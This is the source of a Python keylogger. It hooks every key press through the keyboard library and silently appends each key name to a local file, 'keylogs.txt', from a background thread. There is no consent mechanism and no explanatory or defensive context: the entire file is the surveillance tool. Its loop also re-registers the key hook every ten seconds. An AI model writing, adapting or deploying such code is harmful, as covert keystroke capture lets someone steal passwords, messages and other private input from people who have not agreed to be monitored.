import sys
import time
from threading import Thread
import logging
import os
import keyboard

class Keylogger:
    def __init__(self, log_file):
        self.log_file = log_file
        if not os.path.exists(log_file):
            with open(log_file, 'w') as f:
                pass

    def callback(self, event):
        if event.event_type == keyboard.KEY_DOWN:
            if event.name.isalpha() or event.name.isdigit():
                self.log_key(event.name)
            else:
                self.log_key(event.name + ' ')

    def log_key(self, key):
        with open(self.log_file, 'a') as f:
            f.write(key)

    def start(self):
        while True:
            try:
                keyboard.on_press(self.callback)
                time.sleep(10)  # To prevent high CPU usage
            except Exception as e:
                logging.error(str(e))
                sys.exit()

if __name__ == '__main__':
    log_file = 'keylogs.txt'
    keylogger = Keylogger(log_file)
    Thread(target=keylogger.start).start()